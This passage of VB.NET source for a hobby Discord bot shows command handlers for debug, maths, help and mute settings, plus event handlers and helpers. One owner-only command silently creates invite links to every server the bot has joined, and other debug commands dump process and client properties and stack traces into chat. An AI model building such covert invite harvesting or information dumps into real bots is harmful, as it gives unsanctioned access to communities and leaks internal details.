                pl.Add(Await getProperties(My.Computer.Registry, "Registry", msg))
                pl.Add(Await getProperties(My.Computer.Screen, "Screen", msg))
                pl.Add(Await getProperties(Process.GetCurrentProcess, "Process", msg))
                pl.Add(Await getProperties(Threading.Thread.CurrentThread, "Thread", msg))
                pl.Add(Await getProperties(client, "Client", msg))

                Dim pM As New PaginatedMessage(pl, "Debugger Connected: " & Debugger.IsAttached, New Color(104, 33, 122), msg.Author)

            End If
        ElseIf msg.HasStringPrefix("lb.debug.strikesDB", 0) Then
            If Not msg.Author.Id = ownerID Then
                Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "", "I'm sorry but you do not have the permission to run this command.", "Permissions error", "", ""))
            Else
                Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "", "**From file:** ```json/n" & My.Computer.FileSystem.ReadAllText("databases\strikes.json") & "```/n**From var:**```json/n" & JsonConvert.SerializeObject(StrikesList) & "```", "Strike DB", "", ""))
            End If
        ElseIf msg.HasStringPrefix("lb.debug.forceSave", 0) Then
            If Not msg.Author.Id = ownerID Then
                Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "", "I'm sorry but you do not have the permission to run this command.", "Permissions error", "", ""))
            Else
                saveDatabases()
                Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "", "Saved databases successfully.", "Saved...", "", ""))
            End If
        ElseIf msg.HasStringPrefix("lb.debug.forceLoad", 0) Then
            If Not msg.Author.Id = ownerID Then
                Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "", "I'm sorry but you do not have the permission to run this command.", "Permissions error", "", ""))
            Else
                loadDatabases()
                Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "", "Loaded databases successfully.", "Loaded...", "", ""))
            End If
        ElseIf msg.HasStringPrefix("lb.debug.guild", 0) Then
            If msg.Author.Id = ownerID Then
                Dim guilds = ""
                For Each serverr As SocketGuild In client.Guilds
                    Try
                        guilds = guilds & " " & (Await serverr.DefaultChannel.CreateInviteAsync()).Url
                    Catch ex As Exception
                        guilds = guilds & " No permission to create invite for " & serverr.Name
                    End Try
                Next
                Await msg.Channel.SendMessageAsync(guilds)
            End If
        ElseIf msg.HasStringPrefix("lb.debug.broadcast", 0) Then
            If msg.Author.Id = ownerID Then
                Dim guilds = ""
                For Each serverr As SocketGuild In client.Guilds
                    Try
                        Await serverr.DefaultChannel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "", msg.Content.Replace("lb.debug.broadcast ", "") & " -- <@" & msg.Author.Id & "> (" & msg.Author.Username & ")", "Broadcast from **" & msg.Author.Username & "**", TryCast(msg.Author, IGuildUser).GetAvatarUrl, msg.Author.Username))
                    Catch ex As Exception
                    End Try
                Next
                Await msg.Channel.SendMessageAsync(guilds)
            End If
        Else
            If String.IsNullOrWhiteSpace(msg.Content.Split(".")(2).ToString) Then
                Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "http://sx.thelmgn.com/2017/03/Windows%209%20Icons%20%28158%29.png", "`lb.debug.ping` - Shows the amount of time for me to recognise and process the command. Under 300ms is good./n`lb.debug.computer` - Shows me all the info I need to know. (LMGN only)", msg.Content.Split(".")(1) & " Catergory", "http://sx.thelmgn.com/2017/03/Windows%209%20Icons%20%28313%29.png", "Help"))
            Else
                Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "", "`" & msg.Content.Split(".")(2) & "` is not a valid command in the " & msg.Content.Split(".")(1) & " category. Try `lb." & msg.Content.Split(".")(1) & "` for a list of 'em.", "Invalid command", "http://sx.thelmgn.com/2017/03/Windows%209%20Icons%20%28309%29.png", "Error"))
            End If
        End If
    End Function

    Async Function hMaths(ByVal msg As IUserMessage) As Task
        If msg.HasStringPrefix("lb.maths.eval ", 0) Then
            Dim evalLogo = "http://sx.thelmgn.com/2017/02/2017-02-23_01-20-19.png"
            Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), evalLogo, New DataTable().Compute(msg.Content.Replace("lb.maths.eval ", ""), Nothing), "Evaluate Mathmatical Equasion", evalLogo, "Tungsten Beta (woo science joke)"))
        Else
            If String.IsNullOrWhiteSpace(msg.Content.Split(".")(2).ToString) Then
                Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "http://sx.thelmgn.com/2017/03/Windows%209%20Icons%20%28158%29.png", "`lb.maths.eval (equasion)` - Calculates the answer for the equasion given.", msg.Content.Split(".")(1) & " Catergory", "http://sx.thelmgn.com/2017/03/Windows%209%20Icons%20%28313%29.png", "Help"))
            Else
                Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "", "`" & msg.Content.Split(".")(2) & "` is not a valid command in the " & msg.Content.Split(".")(1) & " category. Try `lb." & msg.Content.Split(".")(1) & "` for a list of 'em.", "Invalid command", "http://sx.thelmgn.com/2017/03/Windows%209%20Icons%20%28309%29.png", "Error"))
            End If
        End If
    End Function

    Async Function hHelp(ByVal msg As IUserMessage) As Task
        If msg.HasStringPrefix("lb.help.welcome", 0) Then
            Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "http://sx.thelmgn.com/2017/03/5999436f48c8f7835827894e40c1abc3%5B1%5D%20%281%29.png", "**Hello!**/n/nI'm " & name & "! A simple bot made in Discord.NET. I can help you with moderation, having fun, searching the web, etc/nType `lb.` to get started!/n/n**Adding me to more servers**/n/nYou can add me to more servers with [this](https://thelmgn.com/db/gi/?id=" & client.CurrentUser.Id & ")/n/n**Greetz**/n/n[LMGN](https://thelmgn.com) for creating me, [Haden](http://thehaden.co/) for creating the EBT Bot Testing server, [RogueException](https://github.com/RogueException) for creating Discord.NET, [Foxbot](http://foxbot.me) for creating the documentation and code examples, The [DiscordAPI](https://discord.gg/discord-api) server for help and [Aurora Community](http://discord.gg/aurora) for being such a great community.", "", "http://sx.thelmgn.com/2017/03/Windows%209%20Icons%20%28158%29.png", "Hi!", "", "You can show this message at anytime with lb.help.welcome"))
        Else
            If String.IsNullOrWhiteSpace(msg.Content.Split(".")(2).ToString) Then
                Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "http://sx.thelmgn.com/2017/03/Windows%209%20Icons%20%28158%29.png", "`lb.help.welcome` - Shows the welcome message that was shown when I joined the server.", msg.Content.Split(".")(1) & " Catergory", "http://sx.thelmgn.com/2017/03/Windows%209%20Icons%20%28313%29.png", "Help"))
            Else
                Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "", "`" & msg.Content.Split(".")(2) & "` is not a valid command in the help category. Try `lb." & msg.Content.Split(".")(1) & "` for a list of 'em.", "Invalid command", "http://sx.thelmgn.com/2017/03/Windows%209%20Icons%20%28309%29.png", "Error"))
            End If
        End If
    End Function

    Async Function hSettings(ByVal msg As IUserMessage) As Task
        If msg.HasStringPrefix("lb.settings.mute", 0) Then
            Dim muteperms = Await TryCast(msg.Channel, IGuildChannel).Guild.GetUserAsync(msg.Author.Id)
            If muteperms.GuildPermissions.ManageChannels Then
                If My.Settings.mutedChannels.Contains(msg.Channel.Id.ToString) Then
                    My.Settings.mutedChannels.Remove(msg.Channel.Id.ToString)
                    Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "", ":speaker: I have been unmuted in this channel!", "Unmute", "", "Muting"))
                Else
                    Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "", ":mute: I have been muted in this channel!", "Mute", "", "Muting"))
                    My.Settings.mutedChannels.Add(msg.Channel.Id.ToString)
                End If
            End If
        Else
            If String.IsNullOrWhiteSpace(msg.Content.Split(".")(2).ToString) Then
                Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "http://sx.thelmgn.com/2017/03/Windows%209%20Icons%20%28158%29.png", "`lb.settings.mute` - Mutes/Unmutes me in this channel.", msg.Content.Split(".")(1) & " Catergory", "http://sx.thelmgn.com/2017/03/Windows%209%20Icons%20%28313%29.png", "Help"))
            Else
                Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "", "`" & msg.Content.Split(".")(2) & "` is not a valid command in the help category. Try `lb." & msg.Content.Split(".")(1) & "` for a list of 'em.", "Invalid command", "http://sx.thelmgn.com/2017/03/Windows%209%20Icons%20%28309%29.png", "Error"))
            End If
        End If
    End Function

    Async Function hC(ByVal msg As IUserMessage) As Task Handles client.MessageReceived
        Dim errorr = ""
        Try
            If msg.Author.Id = client.CurrentUser.Id And My.Settings.mutedChannels.Contains(msg.Channel.Id) Then
                Await msg.DeleteAsync
            ElseIf msg.HasStringPrefix("lb.", 0) Then
                Await Log(New LogMessage(LogSeverity.Verbose, "Commands", "Interpreting message '" & msg.Content & "' from " & msg.Author.Username & " in " & msg.Channel.Name & " as a command."))
                If msg.HasStringPrefix("lb.fun", 0) Then
                    Await hFun(msg)
                ElseIf msg.HasStringPrefix("lb.mod", 0) Then
                    Await hMod(msg)
                ElseIf msg.HasStringPrefix("lb.search", 0) Then
                    Await hSearch(msg)
                ElseIf msg.HasStringPrefix("lb.debug", 0) Then
                    Await Log(New LogMessage(LogSeverity.Verbose, "Commands", "Interpreting message '" & msg.Content & "' from " & msg.Author.Username & " in " & msg.Channel.Name & " as a DBGcommand."))
                    Await hDebug(msg)
                ElseIf msg.HasStringPrefix("lb.maths", 0) Then
                    Await hMaths(msg)
                ElseIf msg.HasStringPrefix("lb.help", 0) Then
                    Await hHelp(msg)
                Else
                    If String.IsNullOrWhiteSpace(msg.Content.Split(".")(1).ToString) Then
                        Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "http://sx.thelmgn.com/2017/03/Windows%209%20Icons%20%28158%29.png", "`lb.fun.` - Fun commands category, commands that are jokey or not very serious go here./n`lb.mod.` - Moderation commands. This is where serious sheet happens./n`lb.search.` - Searches websites like XKCD, DuckDuckGo, Wikipedia, etc./n`lb.debug.` - This is where commands where you can test if the bot is working./n`lb.maths.` - Mathmatical commands. You can now use " & name & " to cheat on your maths homework!/n/n**Add me!**/n/n Click [this](https://thelmgn.com/db/gi/?id=" & client.CurrentUser.Id & ") link to add me to your server.", "Categories", "http://sx.thelmgn.com/2017/03/Windows%209%20Icons%20%28313%29.png", "Help"))
                    Else
                        Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "", "`" & msg.Content.Split(".")(1) & "` is not a valid category. Try `lb.` for a list of 'em.", "Invalid command", "http://sx.thelmgn.com/2017/03/Windows%209%20Icons%20%28309%29.png", "Error"))
                    End If
                End If
            End If
        Catch ex As Exception
            [errorr] = ex.ToString
        End Try
        If errorr = "" Then
        Else
            Dim errorrr = False
            Try
                Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "", ("Error whilst executing command/n```" & errorr).Substring(0, 1997) & "```", "", "http://sx.thelmgn.com/2017/03/Windows%209%20Icons%20%28309%29.png", "Error"))
            Catch
                errorrr = True
            End Try
            If errorrr = True Then
                Await msg.Channel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "", ("Error whilst executing command/n```" & errorr) & "```", "", "http://sx.thelmgn.com/2017/03/Windows%209%20Icons%20%28309%29.png", "Error"))
            End If
        End If

    End Function
    Dim points As List(Of KeyValuePair(Of Integer, Integer)) =
               New List(Of KeyValuePair(Of Integer, Integer))

    Async Function newServer(ByVal guild As SocketGuild) As Task Handles client.JoinedGuild
        Await TryCast(client.GetChannel(295552185826279424), IMessageChannel).SendMessageAsync("I just joined " & guild.Name)
        If client.Guilds.Count > 90 Then
            Await guild.DefaultChannel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "http://sx.thelmgn.com/2017/03/Windows%209%20Icons%20%28309%29.png", "WOAH WE'VE HIT A LIMIT OF 90 GUILDS, I'M OUT. :door:", "Guild limit!", "http://sx.thelmgn.com/2017/03/Windows%209%20Icons%20%28309%29.png", "Critical error!"))
            Await guild.LeaveAsync
            Await TryCast(client.GetChannel(295552185826279424), IMessageChannel).SendMessageAsync("I just left " & guild.Name & " reason: ERR_GUILD_LIMIT")
        Else
            Await guild.DefaultChannel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "http://sx.thelmgn.com/2017/03/5999436f48c8f7835827894e40c1abc3%5B1%5D%20%281%29.png", "**Hello!**/n/nI'm " & name & "! A simple bot made in Discord.NET. I can help you with moderation, having fun, searching the web, etc/nType `lb.help` to get started!/n/n**Adding me to more servers**/n/nYou can add me to more servers with [this](https://thelmgn.com/db/gi/?id=" & client.CurrentUser.Id & ") link/n/n**Greetz**/n/n[LMGN](https://thelmgn.com) for creating me, [Haden](http://thehaden.co/) for creating the EBT Bot Testing server, [RogueException](https://github.com/RogueException) for creating Discord.NET, [Foxbot](http://foxbot.me) for creating the documentation and code examples, The [DiscordAPI](https://discord.gg/discord-api) server for help and [Aurora Community](http://discord.gg/aurora) for being such a great community.", "", "http://sx.thelmgn.com/2017/03/Windows%209%20Icons%20%28158%29.png", "Hi!", "", "You can show this message at anytime with lb.help.welcome"))

        End If
    End Function

    Async Function leftServer(ByVal guild As SocketGuild) As Task Handles client.LeftGuild
        Await TryCast(client.GetChannel(295552185826279424), IMessageChannel).SendMessageAsync("I just left " & guild.Name)
    End Function

    Async Function HandleBanne(ByVal user As SocketUser, guild As IGuild) As Task Handles client.UserBanned
        Dim banneChannel = Await guild.GetDefaultChannelAsync()
        Await banneChannel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "http://sx.thelmgn.com/2017/02/6b3cc6ff5c09de83cc37561a43304dee%281%29.gif", user.Username & " got banne™", "", "", "Banne™"))
    End Function

    Async Function HandleUnbanne(ByVal user As SocketUser, guild As IGuild) As Task Handles client.UserUnbanned
        Dim banneChannel = Await guild.GetDefaultChannelAsync()
        Await banneChannel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(0), Convert.ToByte(255), Convert.ToByte(0)), "", user.Username & " got unbanne™", "", "", "Unbanne™"))
    End Function

    Function getAge(Time As TimeSpan)
        If Time.TotalDays > 1 Then
            Return Math.Floor(Time.TotalDays) & " day(s)"
        Else
            If Time.TotalHours > 1 Then
                Return Math.Floor(Time.TotalHours) & " hours(s)"
            Else
                If Time.TotalMinutes > 1 Then
                    Return Math.Floor(Time.TotalMinutes) & " minute(s)"
                Else
                    Return Time.TotalSeconds & " second(s)"
                End If
            End If
        End If
    End Function
    Public Function GetRandom(ByVal Min As Integer, ByVal Max As Integer) As Integer
        Dim Generator As System.Random = New System.Random()
        Return Generator.Next(Min, Max)
    End Function
    Async Function HandleJoine(ByVal user As SocketGuildUser) As Task Handles client.UserJoined
        Await user.Guild.DefaultChannel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(0), Convert.ToByte(255), Convert.ToByte(0)), "", user.Username & " joine™, they signed up " & getAge(DateTime.UtcNow - user.CreatedAt) & " ago.", "", "", "User joine™."))

    End Function

    Async Function HandleKicke(ByVal user As SocketGuildUser) As Task Handles client.UserLeft
        Await user.Guild.DefaultChannel.SendMessageAsync("", False, getEmbed(New Color(Convert.ToByte(255), Convert.ToByte(0), Convert.ToByte(0)), "", user.Username & " got kicke™ or left", "", "", "User leave."))
    End Function

    Function widetext(text As String)
        Return text.ToLower.Replace("a", "Ａ").Replace("b", "Ｂ").Replace("c", "Ｃ").Replace("d", "Ｄ").Replace("e", "Ｅ").Replace("f", "Ｆ").Replace("g", "Ｇ").Replace("h", "Ｈ").Replace("i", "Ｉ").Replace("j", "Ｊ").Replace("k", "Ｋ").Replace("l", "Ｌ").Replace("m", "Ｍ").Replace("n", "Ｎ").Replace("o", "Ｏ").Replace("p", "Ｐ").Replace("q", "Ｑ").Replace("r", "Ｒ").Replace("s", "Ｓ").Replace("t", "Ｔ").Replace("u", "Ｕ").Replace("v", "Ｖ").Replace("w", "Ｗ").Replace("x", "Ｘ").Replace("y", "Ｙ").Replace("z", "Ｚ")
    End Function

    Async Function getProperties(propertyy As Object, name As String, msg As IMessage) As Task(Of String)
        '
        Try
            Dim propertystring = ""
            Dim type As Type = [propertyy].GetType()
            Dim properties As PropertyInfo() = type.GetProperties()

            For Each [property] As PropertyInfo In properties
                Try
                    propertystring = propertystring & [property].Name & vbNewLine
                    propertystring = propertystring & "Count: " & [property].GetValue(propertyy, Nothing).Count & vbNewLine
                Catch
                    propertystring = propertystring & [property].Name & vbNewLine
                    propertystring = propertystring & "`" & [property].GetValue(propertyy, Nothing) & "`" & vbNewLine
                End Try

            Next
            Return "**" & type.Name & "**" & vbNewLine & vbNewLine & propertystring
        Catch
        End Try



    End Function

    Function getEmbed(color As Color, thumbURL As String, desc As String, title As String, authorURL As String, authorname As String, Optional Link As String = "", Optional Footer As String = "")
        Dim eb As EmbedBuilder
        eb = New EmbedBuilder() With {
                    .color = color,
                    .title = title,
    .ThumbnailUrl = thumbURL,
    .Description = desc.Replace("/n", vbNewLine),
    .Author = New EmbedAuthorBuilder() With {
    .IconUrl = authorURL,
    .name = authorname
        },
    .Footer = New EmbedFooterBuilder() With {
        .Text = "" & name & " 3 Open-Beta. Proudly built with Discord.NET. Uptime: " & (DateTime.Now - uptime).ToString & ". " & Footer,
        .IconUrl = client.CurrentUser.GetAvatarUrl
    }
}


        Return eb.Build
    End Function


End Class
